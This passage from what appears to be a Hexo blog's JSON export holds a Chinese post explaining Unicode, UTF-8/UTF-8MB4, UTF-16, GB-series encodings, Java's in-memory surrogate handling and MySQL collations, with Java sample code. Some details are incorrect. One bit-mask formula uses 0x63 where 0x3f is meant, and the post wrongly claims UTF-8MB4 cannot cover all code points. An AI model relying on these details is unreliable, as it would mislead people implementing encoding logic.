8));\n\t\tSystem.out.println(Integer.toHexString(low & 0xff));\n\t\tSystem.out.println(\"-----------------\");\n\n\t\tSystem.out.println();\n\t\tSystem.out.println(\"重复输入一次，验证unicode编码\");\n\t\tScanner scanner = new Scanner(System.in);\n\t\tif (scanner.hasNext()) {\n\t\t\tString next = scanner.next();\n\t\t\tSystem.out.println();\n\t\t\tSystem.out.println(encode(next, true));\n\t\t}\n\t}\n```\n\n\n\n## MySQL中的编码\n\n了解了码点以及Java编码转化的本质后，应该能够明白MySQL中，如果客户端与服务器端编码不同，首先字符集就已经不同，那么存入数据库之后出现乱码也就不难理解了。\n\n在MySQL数据库中，新建数据库的时候会要求选择字符集和排序规则，这里的字符集就是本文所说的编码规则，而排序规则，则是在SQL查询中对文本排序时的排序依据（可以类比为Java中`java.util.Comparator`的实现），比如：是按ASCII码排序、还是按汉字拼音首字母排序、或者按德语字母顺序排序、或者排序时大小写不同是否看成同一个字符。\n\n以常用的`utf8mb4_general_ci`、`utf8mb4_unicode_ci`和`utf8mb4_bin`为例：`utf8mb4_unicode_ci`针对各语言做了比较复杂的处理，在各语言中的排序更加准确（主要是在德语、法语等一部分语言中有影响，对中文、英文没影响），排序速度较慢；`utf8mb4_general_ci`大小写不敏感，相比`utf8mb4_unicode_ci`排序速度也更快，`utf8mb4_bin`大小写敏感。\n\n\n\n\n","source":"_posts/2020-02-13_character_set_encoding.md","raw":"---\ntitle: 理解字符集编码及Java内存编码运行机制\ndate: 2020-02-13 22:15:32\ntags: encoding\npermalink: character-set-encoding\nkeywords: 字符集编码, java内存\nrId: MB-20021301\n---\n\n## 常见编码详悉\n\n### Unicode和UTF-8的关系\n\nUnicode又称万国码，它将全世界大部分语言的常用字符都纳入了编码范围。Unicode和UTF-8的关系简单的来说可以理解为：\n\n* Unicode是字符集\n* UTF-8是编码规则\n\n字符集：为每一个“字符”分配一个唯一的数值（ID，或称码点、码位），即给汉字、英文等各种字符分配一个不重复的数值\n\n编码规则：将“码点”转换为字节序列的规则（数值转化为字节值的过程）\n\n\n\nUnicode字符集为每一个字符分配一个码点，例如：“中”的码点是20013，记作U+4E2D（20013的16进制是4E2D）\n\nUTF-8是一套以8位为一个编码单位的可变长编码，会将一个码点编码为1到4个字节（广义上的UTF-8），编码规则如下：\n\n```\n  U+0000 ~   U+007F: 0XXXXXXX\n  U+0080 ~   U+07FF: 110XXXXX 10XXXXXX\n  U+0800 ~   U+FFFF: 1110XXXX 10XXXXXX 10XXXXXX\n U+10000 ~ U+10FFFF: 11110XXX 10XXXXXX 10XXXXXX 10XXXXXX\n```\n\n根据上表可知，“中”字的码点U+4E2D属于第三行范围：\n\n```184\n       4    E    2    D\n‭    0100 1110 0010 1101‬    二进制值\n------------------------\n    0100   111000   101101 二进制值重新对齐\n1110XXXX 10XXXXXX 10XXXXXX 模板\n11100100 10111000 10101101 代入模板后值\n     228      184      173 字节值(byte，负值处理为正值了+256)\n```\n\n\n\n我们可以用java编写程序实现unicode值（16进制表示）和字符的转换，如下所示\n\n```\npublic class UnicodeCoder {\n\t/**\n\t * 字符串转为unicode值，参数二是否将ASCII字符转为unicode表示\n\t */\n\tpublic static String encode(String str, boolean encodeAscii) {\n\t\tStringBuilder sb = new StringBuilder();\n\t\tchar[] charArray = str.toCharArray();\n\t\tfor (int i = 0; i < charArray.length; i++) {\n\t\t\tchar c = charArray[i];\n\t\t\tsb.append(charToUnicodeString(c, encodeAscii));\n\t\t}\n\t\treturn sb.toString();\n\t}\n\t/**\n\t * unicode值转为字符串\n\t */\n\tpublic static String decode(String str) throws UnsupportDecodeException {\n\t\tStringBuilder sb = new StringBuilder();\n\t\tchar[] charArray = str.toCharArray();\n\t\tfor (int i = 0; i < charArray.length; i++) {\n\t\t\tchar c = charArray[i];\n\t\t\tif (c == '\\\\') {\n\t\t\t\tif (i == charArray.length - 1) {\n\t\t\t\t\tthrow new UnsupportDecodeException();\n\t\t\t\t}\n\t\t\t\tif (charArray[i + 1] == '\\\\') {\n\t\t\t\t\tsb.append(\"\\\\\");\n\t\t\t\t\ti++;\n\t\t\t\t} else if (charArray[i + 1] == 'u') {\n\t\t\t\t\tif (i >= charArray.length - 5 || !isHexChar(charArray[i + 2])\n\t\t\t\t\t\t\t || !isHexChar(charArray[i + 3]) || !isHexChar(charArray[i + 4])\n\t\t\t\t\t\t\t || !isHexChar(charArray[i + 5])) {\n\t\t\t\t\t\tthrow new UnsupportDecodeException();\n\t\t\t\t\t}\n\t\t\t\t\tString hexInt = \"\" + charArray[i + 2] + charArray[i + 3] + charArray[i + 4] + charArray[i + 5];\n\t\t\t\t\tchar v = (char) Integer.valueOf(hexInt, 16).intValue();\n\t\t\t\t\tsb.append(v);\n\t\t\t\t\ti += 5;\n\t\t\t\t} else {\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\tsb.append(c);\n\t\t\t}\n\t\t}\n\t\treturn sb.toString();\n\t}\n\tprivate static boolean isHexChar(char c) {\n\t\tif (c >= '0' && c <= '9') return true;\n\t\tif (c >= 'a' && c <= 'f') return true;\n\t\tif (c >= 'A' && c <= 'F') return true;\n\t\treturn false;\n\t}\n\tprivate static String charToUnicodeString(char c, boolean encodeAscii) {\n\t\tif (c < 0x80 && !encodeAscii) {\n\t\t\tif (c == '\\\\') {\n\t\t\t\treturn \"\\\\\\\\\";\n\t\t\t} else {\n\t\t\t\treturn c + \"\";\n\t\t\t}\n\t\t}\n\t\tString hex = Integer.toHexString(c);\n\t\tif (c < 0x10) {\n\t\t\treturn \"\\\\u000\" + hex;\n\t\t} else if (c < 0x100) {\n\t\t\treturn \"\\\\u00\" + hex;\n\t\t} else if (c < 0x1000) {\n\t\t\treturn \"\\\\u0\" + hex;\n\t\t} else {\n\t\t\treturn \"\\\\u\" + hex;\n\t\t}\n\t}\n\tpublic static class UnsupportDecodeException extends Exception {\n\t\tprivate static final long serialVersionUID = 1L;\n\n\t\tpublic UnsupportDecodeException() {\n\t\t}\n\t}\n\tpublic static void main(String[] args) throws UnsupportDecodeException {\n\t\tSystem.out.println(encode(\"中abcµ\", true)); // \\u4e2d\n\t\tSystem.out.println(\"\\u4e2d\"); // 不需要转换，jvm自动处理\n\t\tSystem.out.println(decode(\"\\\\u4e2d\")); // 中\n\t}\n}\n```\n\n### UTF-8和UTF-8MB4关系\n\nUnicode字符集，实际上有两个系列，分为2个字节和4个字节的两种，2个字节的Unicode字符集称为`UCS-2`（通常说的Unicode大都是`UCS-2`），4个字节的Unicode字符集称为`UCS-4`，`UCS-4`是`UCS-2`的超集。`UCS-2`可容纳65536个码位，`UCS-4`目前可用码位分为了17个平面（每个平面可容纳65536个码位，即一共1114112个码位，第1个平面被称为基本多语言平面，即`UCS-2`的字符集，其他16个平面统称为辅助平面），它为现有的所有文字和符号以及将来可能出现的字符都指定（或预留）了一个唯一的数字编码。\n\n**UTF-8MB3**\n\n通常所说的UTF-8（即狭义上的UTF-8），实际上是UTF-8MB3，一个字符占1-3个字节（只有编码规则的前三行），它是以`UCS-2`为字符集的编码规则。\n\n**UTF-8MB4**\n\n除了UTF-8MB3以外，还存在UTF-8MB4编码，一个字符占1-4个字节，可以表示超过65536个字符（没能达到1114112个，仅能表示20多万个），因此有能力表示`UCS-4`中的部分字符。\n\n\n\n### UTF-8、UTF-16和GBK、GB2312的区别\n\nUFT-8、UTF-16、GBK、GB2312都能编码汉字，但在汉字的支持数量上、以及字符集上有所差异。\n\n**GB2312**\n\nGB2312是由国内制定，在ASCII码的基础上扩充汉字编码制定的字符集与编码规则，共收录了6763个常用汉字，英文占一个字节，汉字占两个字节。\n\n**GBK**\n\nGBK编码，扩展了GB2312编码收录的字符数量，并沿用了GB2312的码位（是GB2312编码的超集），收录了21003个汉字，包含`UCS-2`汉字区的全部汉字。英文占一个字节，汉字占两个字节，向下兼容GB2312编码。\n\n**GB18030**\n\nGB18030编码，在GBK的基础上再次扩充了汉字字符数量，并增加了少数民族字符，收录了70244个汉字。与GB2312-1980完全向后兼容，与GBK基本兼容，并支持Unicode的所有码位。编码包含三种长度：单子节ASCII，双字节的GBK（略带扩展）、以及用于填补所有Unicode码位的四字节UTF区块（Unicode码位数1114112少于GB18030的161668个码位）。\n\n**BIG5**\n\nBIG5编码是台湾制定的基于ASCII扩充的中文编码规则，但其与GB2312字符集码位不是一个体系。\n\n\n\n**UTF-8**\n\n就像GBK编码一样，各国都对ASCII进行扩展定义了自己的编码，不利于国际间文件交换。Unicode编码是在这种背景下，国际标准组织将世界各国语言都纳入了编码体系，形成的一个字符集。\n\n前面说过Unicode有`UCS-2`和`UCS-4`两种，`UCS-2`汉字编码范围在U+4E00-9FA5，包含20928个汉字（仅汉字区），容纳中日韩（CJK）统一编码的汉字共27484个（日语区和韩语区也有部分日语韩语常用汉字）。而`UCS-4`的第1个平面即是`UCS-2`的码位，所以包含的汉字数量必然大于`UCS-2`（具体值没找到资料）。\n\nUTF-8MB3编码，以`UCS-2`字符集为基础的编码，而UTF-8MB4已经超过`UCS-2`字符集，包含部分`UCS-4`字符。\n\n**UTF-16**\n\nUTF-16与UTF-8一样，是众多UTF(UCS Transfer Format)标准中的一个，它是以`UCS-4`为字符集的编码规则，有2个字节和4个字节两种长度，2个字节的用于编码“基本多语言平面中的字符”（即`UCS-2`部分），4个字符编码其余辅助平面的字符。\n\n\n\nUTF-8和UTF-16算是一个字符集体系的编码，GB系列算一个字符集体系的编码。\n\n\n\n## Java中的内存编码\n\nJava内存唯一使用的编码是`Unicode`（`UCS-2`字符集，注意是内存编码，不是运行时与用户交互的编码）。平时调用的`String.getBytes()`方法，实际上就是将内存中字符的码点按指定编码规则组织为bytes数组，同理，`new String(bytes)`方法，即是将bytes数组按指定编码规则翻译成码点存在内存中。\n\n\n### 前端输入的emoji字符由UTF-8MB4编码，传到后端Java是如何处理的呢？\n\nJava采取的策略是将其转为两个UTF-8MB3字符。具体转换过程如下：\n\n1. **首先读取字节，如以\"😭\"表情为例，读取到如下字节（负数已处理为正数）**\n```\n240       159       152       173\n```\n二进制表示为\n```\nbytes[0]  bytes[1]  bytes[2]  bytes[3]\n‭11110000‬  ‭10011111‬  ‭10011000‬  ‭10101101‬\n```\n由于值是以utf8mb4编码的，观察二进制值，符合如下模板格式，抽离模板后即可得到码点值的二进制代码\n```\n11110xxx  10xxxxxx  10xxxxxx  10xxxxxx    二进制值模板\n     000    011111    011000‬    101101‬    抽离模板后得到码点值的二进制表示\n```\n上述码点值计算的过程可以用如下公式表示\n```\ncodePoint = ((bytes[0] & 0x7) << 18) + ((bytes[1] & 0x3f) << 12) + (bytes[2] & 0x3f) << 6) + (bytes[3] & 0x3f)\n```\n\n2. **将UTF-8MB4字符拆成为两个字符**\n步骤如下\n* 先将码点值减掉(2^16)，并去掉第1位\n```\nval = codePoint - (1 << 16)\nval = val & 0xFFFFF;\n     000    001111    011000    101101        计算后的二进制值\n      00    001111    011000    101101        去掉第1位\n```\n* 然后填充到固定转化模板（后面解释），得到两个三字节的UTF-8编码值\n```\n11101101  1010xxxx  10xxxxxx    11101101  1011xxxx  10xxxxxx    固定转化模板\n11101101  10100000  10111101    11101101  10111000  10101101    填充后二进制值\n```\n* 再计算新的码点（此时是两个三字节的UTF-8编码值，所以有如下模板）\n```\n1110xxxx  10xxxxxx  10xxxxxx    1110xxxx  10xxxxxx  10xxxxxx    三字节格式二进制值模板\n    1101    100000    111101        1101    111000    101101    抽离模板后值\n```\n* 整理二进制位，得到两个新的Unicode码点：D83D, DE2D\n```\n11011000  00111101              11011110  00101101\nD83D                            DE2D\n```\n\n上面的转换步骤稍加整理后，可以得到公式：\n\n```\n新码点的值计算：\nval = ((bytes[0] & 0x7) << 18) + ((bytes[1] & 0x63) << 12) + (bytes[2] & 0x63) << 6) + (bytes[3] & 0x63) - (1 << 16)\nval = val & 0xFFFFF\n// 110110xxxxxxxxxx 110111xxxxxxxxxx    来自固定转化模板的值\n// 0b110110 = 54\n// 54 << 10 = 0xD800\ncodePointN[0] = (val >>> 10) + 0xD800\n// 0b110111 = 55\n// 55 << 10 = 0xDC00\ncodePointN[1] = (val & 0x3FF) + 0xDC00\n```\n\n\n\n**拆分字符时使用的固定转化模板为什么是这个？**\n\n**其一** 3字节UTF-8，固定了一些位\n\n```\n1110xxxx  10xxxxxx  10xxxxxx    1110xxxx  10xxxxxx  10xxxxxx\n```\n\n**其二** 新码点不能与UTF-8MB3冲突，所以选用为UTF-16永久保留不映射的码点区间(`0xD800-0xDBFF`和`0xDC00-0xDFFF`)作为新值所在的区间（两个区间的区别只是与大端和小端的规定有关）\n因此又可以固定剩余几位（`D8`二进制为‭`11011000`‬，`DB`二进制为‭`11011011`‬，`DC`二进制为`‭11011100`‬，`DF`二进制为`‭11011111`‬）\n\n```\n11101101  1010xxxx  10xxxxxx    11101101  1011xxxx  10xxxxxx\n```\n\n**关于码点值减掉(2^16)**\n\n参见JDK中的`java.lang.Character#highSurrogate`方法，这是用于计算高位值的方法\n\n相应的，低位值计算方法见`java.lang.Character#lowSurrogate`方法\n\n它们被调用的位置见`sun.nio.cs.UTF_8.Decoder#decode`方法\n\n\n\n### 关于内存编码处理的测试代码\n```\n\t...\n\tpublic static void main(String[] args) throws IOException, UnsupportDecodeException {\n\t\tbyte[] bytes = new byte[10];\n\t\tint read = System.in.read(bytes);\n\t\tSystem.out.println(\"读取byte如下 --> \");\n\t\tfor (int i = 0; i < read; i++) { // 最后一个打印10为回车键\n\t\t\tSystem.out.println(bytes[i] & 0xff);\n\t\t}\n\t\tSystem.out.println(\"读取内容如下 --> \");\n\t\tSystem.out.println(new String(bytes, 0, read));\n\t\tSystem.out.println(\"-----------------\");\n\t\tint val = ((bytes[0] & 0x7) << 18) + ((bytes[1] & 0x3f) << 12) + ((bytes[2] & 0x3f) << 6) + (bytes[3] & 0x3f) - (1 << 16);\n\t\tval = val & 0xFFFFF;\n\t\tint high = (val >>> 10) + 0xD800;\n\t\tint low = (val & 0x3FF) + 0xDC00;\n\t\tSystem.out.println(Integer.toHexString((high & 0xffff) >> 8));\n\t\tSystem.out.println(Integer.toHexString(high & 0xff));\n\t\tSystem.out.println(Integer.toHexString((low & 0xffff) >> 8));\n\t\tSystem.out.println(Integer.toHexString(low & 0xff));\n\t\tSystem.out.println(\"-----------------\");\n\n\t\tSystem.out.println();\n\t\tSystem.out.println(\"重复输入一次，验证unicode编码\");\n\t\tScanner scanner = new Scanner(System.in);\n\t\tif (scanner.hasNext()) {\n\t\t\tString next = scanner.next();\n\t\t\tSystem.out.println();\n\t\t\tSystem.out.println(encode(next, true));\n\t\t}\n\t}\n```\n\n\n\n## MySQL中的编码\n\n了解了码点以及Java编码转化的本质后，应该能够明白MySQL中，如果客户端与服务器端编码不同，首先字符集就已经不同，那么存入数据库之后出现乱码也就不难理解了。\n\n在MySQL数据库中，新建数据库的时候会要求选择字符集和排序规则，这里的字符集就是本文所说的编码规则，而排序规则，则是在SQL查询中对文本排序时的排序依据（可以类比为Java中`java.util.Comparator`的实现），比如：是按ASCII码排序、还是按汉字拼音首字母排序、或者按德语字母顺序排序、或者排序时大小写不同是否看成同一个字符。\n\n以常用的`utf8mb4_general_ci`、`utf8mb4_unicode_ci`和`utf8mb4_bin`为例：`utf8mb4_unicode_ci`针对各语言做了比较复杂的处理，在各语言中的排序更加准确（主要是在德语、法语等一部分语言中有影响，对中文、英文没影响），排序速度较慢；`utf8mb4_general_ci`大小写不敏感，相比`utf8mb4_unicode_ci`排序速度也更快，`utf8mb4_bin`大小写敏感。\n\n\n\n\n","slug":"character-set-encoding","published":1,"updated":"2020-02-24T07:00:19.498Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck71vzlej0003swukx0qhzd72","content":"<h2 id=\"常见编码详悉\"><a href=\"#常见编码详悉\" class=\"headerlink\" title=\"常见编码详悉\"></a>常见编码详悉</h2><h3 id=\"Unicode和UTF-8的关系\"><a href=\"#Unicode和UTF-8的关系\" class=\"headerlink\" title=\"Unicode和UTF-8的关系\"></a>Unicode和UTF-8的关系</h3><p>Unicode又称万国码，它将全世界大部分语言的常用字符都纳入了编码范围。Unicode和UTF-8的关系简单的来说可以理解为：</p>\n<ul>\n<li>Unicode是字符集</li>\n<li>UTF-8是编码规则</li>\n</ul>\n<p>字符集：为每一个“字符”分配一个唯一的数值（ID，或称码点、码位），即给汉字、英文等各种字符分配一个不重复的数值</p>\n<p>编码规则：将“码点”转换为字节序列的规则（数值转化为字节值的过程）</p>\n<p>Unicode字符集为每一个字符分配一个码点，例如：“中”的码点是20013，记作U+4E2D（20013的16进制是4E2D）</p>\n<p>UTF-8是一套以8位为一个编码单位的可变长编码，会将一个码点编码为1到4个字节（广义上的UTF-8），编码规则如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> U+0000 ~   U+007F: 0XXXXXXX</span><br><span class=\"line\"> U+0080 ~   U+07FF: 110XXXXX 10XXXXXX</span><br><span class=\"line\"> U+0800 ~   U+FFFF: 1110XXXX 10XXXXXX 10XXXXXX</span><br><span class=\"line\">U+10000 ~ U+10FFFF: 11110XXX 10XXXXXX 10XXXXXX 10XXXXXX</span><br></pre></td></tr></table></figure>\n\n<p>根据上表可知，“中”字的码点U+4E2D属于第三行范围：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">       4    E    2    D</span><br><span class=\"line\">‭    0100 1110 0010 1101‬    二进制值</span><br><span class=\"line\">------------------------</span><br><span class=\"line\">    0100   111000   101101 二进制值重新对齐</span><br><span class=\"line\">1110XXXX 10XXXXXX 10XXXXXX 模板</span><br><span class=\"line\">11100100 10111000 10101101 代入模板后值</span><br><span class=\"line\">     228      184      173 字节值(byte，负值处理为正值了+256)</span><br></pre></td></tr></table></figure>\n\n<p>我们可以用java编写程序实现unicode值（16进制表示）和字符的转换，如下所示</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class UnicodeCoder &#123;</span><br><span class=\"line\">\t/**</span><br><span class=\"line\">\t * 字符串转为unicode值，参数二是否将ASCII字符转为unicode表示</span><br><span class=\"line\">\t */</span><br><span class=\"line\">\tpublic static String encode(String str, boolean encodeAscii) &#123;</span><br><span class=\"line\">\t\tStringBuilder sb = new StringBuilder();</span><br><span class=\"line\">\t\tchar[] charArray = str.toCharArray();</span><br><span class=\"line\">\t\tfor (int i = 0; i &lt; charArray.length; i++) &#123;</span><br><span class=\"line\">\t\t\tchar c = charArray[i];</span><br><span class=\"line\">\t\t\tsb.append(charToUnicodeString(c, encodeAscii));</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\treturn sb.toString();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t/**</span><br><span class=\"line\">\t * unicode值转为字符串</span><br><span class=\"line\">\t */</span><br><span class=\"line\">\tpublic static String decode(String str) throws UnsupportDecodeException &#123;</span><br><span class=\"line\">\t\tStringBuilder sb = new StringBuilder();</span><br><span class=\"line\">\t\tchar[] charArray = str.toCharArray();</span><br><span class=\"line\">\t\tfor (int i = 0; i &lt; charArray.length; i++) &#123;</span><br><span class=\"line\">\t\t\tchar c = charArray[i];</span><br><span class=\"line\">\t\t\tif (c == &apos;\\\\&apos;) &#123;</span><br><span class=\"line\">\t\t\t\tif (i == charArray.length - 1) &#123;</span><br><span class=\"line\">\t\t\t\t\tthrow new UnsupportDecodeException();</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\tif (charArray[i + 1] == &apos;\\\\&apos;) &#123;</span><br><span class=\"line\">\t\t\t\t\tsb.append(&quot;\\\\&quot;);</span><br><span class=\"line\">\t\t\t\t\ti++;</span><br><span class=\"line\">\t\t\t\t&#125; else if (charArray[i + 1] == &apos;u&apos;) &#123;</span><br><span class=\"line\">\t\t\t\t\tif (i &gt;= charArray.length - 5 || !isHexChar(charArray[i + 2])</span><br><span class=\"line\">\t\t\t\t\t\t\t || !isHexChar(charArray[i + 3]) || !isHexChar(charArray[i + 4])</span><br><span class=\"line\">\t\t\t\t\t\t\t || !isHexChar(charArray[i + 5])) &#123;</span><br><span class=\"line\">\t\t\t\t\t\tthrow new UnsupportDecodeException();</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t\tString hexInt = &quot;&quot; + charArray[i + 2] + charArray[i + 3] + charArray[i + 4] + charArray[i + 5];</span><br><span class=\"line\">\t\t\t\t\tchar v = (char) Integer.valueOf(hexInt, 16).intValue();</span><br><span class=\"line\">\t\t\t\t\tsb.append(v);</span><br><span class=\"line\">\t\t\t\t\ti += 5;</span><br><span class=\"line\">\t\t\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\t\tsb.append(c);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\treturn sb.toString();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tprivate static boolean isHexChar(char c) &#123;</span><br><span class=\"line\">\t\tif (c &gt;= &apos;0&apos; &amp;&amp; c &lt;= &apos;9&apos;) return true;</span><br><span class=\"line\">\t\tif (c &gt;= &apos;a&apos; &amp;&amp; c &lt;= &apos;f&apos;) return true;</span><br><span class=\"line\">\t\tif (c &gt;= &apos;A&apos; &amp;&amp; c &lt;= &apos;F&apos;) return true;</span><br><span class=\"line\">\t\treturn false;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tprivate static String charToUnicodeString(char c, boolean encodeAscii) &#123;</span><br><span class=\"line\">\t\tif (c &lt; 0x80 &amp;&amp; !encodeAscii) &#123;</span><br><span class=\"line\">\t\t\tif (c == &apos;\\\\&apos;) &#123;</span><br><span class=\"line\">\t\t\t\treturn &quot;\\\\\\\\&quot;;</span><br><span class=\"line\">\t\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\t\treturn c + &quot;&quot;;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tString hex = Integer.toHexString(c);</span><br><span class=\"line\">\t\tif (c &lt; 0x10) &#123;</span><br><span class=\"line\">\t\t\treturn &quot;\\\\u000&quot; + hex;</span><br><span class=\"line\">\t\t&#125; else if (c &lt; 0x100) &#123;</span><br><span class=\"line\">\t\t\treturn &quot;\\\\u00&quot; + hex;</span><br><span class=\"line\">\t\t&#125; else if (c &lt; 0x1000) &#123;</span><br><span class=\"line\">\t\t\treturn &quot;\\\\u0&quot; + hex;</span><br><span class=\"line\">\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\treturn &quot;\\\\u&quot; + hex;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tpublic static class UnsupportDecodeException extends Exception &#123;</span><br><span class=\"line\">\t\tprivate static final long serialVersionUID = 1L;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tpublic UnsupportDecodeException() &#123;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tpublic static void main(String[] args) throws UnsupportDecodeException &#123;</span><br><span class=\"line\">\t\tSystem.out.println(encode(&quot;中abcµ&quot;, true)); // \\u4e2d</span><br><span class=\"line\">\t\tSystem.out.println(&quot;\\u4e2d&quot;); // 不需要转换，jvm自动处理</span><br><span class=\"line\">\t\tSystem.out.println(decode(&quot;\\\\u4e2d&quot;)); // 中</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"UTF-8和UTF-8MB4关系\"><a href=\"#UTF-8和UTF-8MB4关系\" class=\"headerlink\" title=\"UTF-8和UTF-8MB4关系\"></a>UTF-8和UTF-8MB4关系</h3><p>Unicode字符集，实际上有两个系列，分为2个字节和4个字节的两种，2个字节的Unicode字符集称为<code>UCS-2</code>（通常说的Unicode大都是<code>UCS-2</code>），4个字节的Unicode字符集称为<code>UCS-4</code>，<code>UCS-4</code>是<code>UCS-2</code>的超集。<code>UCS-2</code>可容纳65536个码位，<code>UCS-4</code>目前可用码位分为了17个平面（每个平面可容纳65536个码位，即一共1114112个码位，第1个平面被称为基本多语言平面，即<code>UCS-2</code>的字符集，其他16个平面统称为辅助平面），它为现有的所有文字和符号以及将来可能出现的字符都指定（或预留）了一个唯一的数字编码。</p>\n<p><strong>UTF-8MB3</strong></p>\n<p>通常所说的UTF-8（即狭义上的UTF-8），实际上是UTF-8MB3，一个字符占1-3个字节（只有编码规则的前三行），它是以<code>UCS-2</code>为字符集的编码规则。</p>\n<p><strong>UTF-8MB4</strong></p>\n<p>除了UTF-8MB3以外，还存在UTF-8MB4编码，一个字符占1-4个字节，可以表示超过65536个字符（没能达到1114112个，仅能表示20多万个），因此有能力表示<code>UCS-4</code>中的部分字符。</p>\n<h3 id=\"UTF-8、UTF-16和GBK、GB2312的区别\"><a href=\"#UTF-8、UTF-16和GBK、GB2312的区别\" class=\"headerlink\" title=\"UTF-8、UTF-16和GBK、GB2312的区别\"></a>UTF-8、UTF-16和GBK、GB2312的区别</h3><p>UFT-8、UTF-16、GBK、GB2312都能编码汉字，但在汉字的支持数量上、以及字符集上有所差异。</p>\n<p><strong>GB2312</strong></p>\n<p>GB2312是由国内制定，在ASCII码的基础上扩充汉字编码制定的字符集与编码规则，共收录了6763个常用汉字，英文占一个字节，汉字占两个字节。</p>\n<p><strong>GBK</strong></p>\n<p>GBK编码，扩展了GB2312编码收录的字符数量，并沿用了GB2312的码位（是GB2312编码的超集），收录了21003个汉字，包含<code>UCS-2</code>汉字区的全部汉字。英文占一个字节，汉字占两个字节，向下兼容GB2312编码。</p>\n<p><strong>GB18030</strong></p>\n<p>GB18030编码，在GBK的基础上再次扩充了汉字字符数量，并增加了少数民族字符，收录了70244个汉字。与GB2312-1980完全向后兼容，与GBK基本兼容，并支持Unicode的所有码位。编码包含三种长度：单子节ASCII，双字节的GBK（略带扩展）、以及用于填补所有Unicode码位的四字节UTF区块（Unicode码位数1114112少于GB18030的161668个码位）。</p>\n<p><strong>BIG5</strong></p>\n<p>BIG5编码是台湾制定的基于ASCII扩充的中文编码规则，但其与GB2312字符集码位不是一个体系。</p>\n<p><strong>UTF-8</strong></p>\n<p>就像GBK编码一样，各国都对ASCII进行扩展定义了自己的编码，不利于国际间文件交换。Unicode编码是在这种背景下，国际标准组织将世界各国语言都纳入了编码体系，形成的一个字符集。</p>\n<p>前面说过Unicode有<code>UCS-2</code>和<code>UCS-4</code>两种，<code>UCS-2</code>汉字编码范围在U+4E00-9FA5，包含20928个汉字（仅汉字区），容纳中日韩（CJK）统一编码的汉字共27484个（日语区和韩语区也有部分日语韩语常用汉字）。而<code>UCS-4</code>的第1个平面即是<code>UCS-2</code>的码位，所以包含的汉字数量必然大于<code>UCS-2</code>（具体值没找到资料）。</p>\n<p>UTF-8MB3编码，以<code>UCS-2</code>字符集为基础的编码，而UTF-8MB4已经超过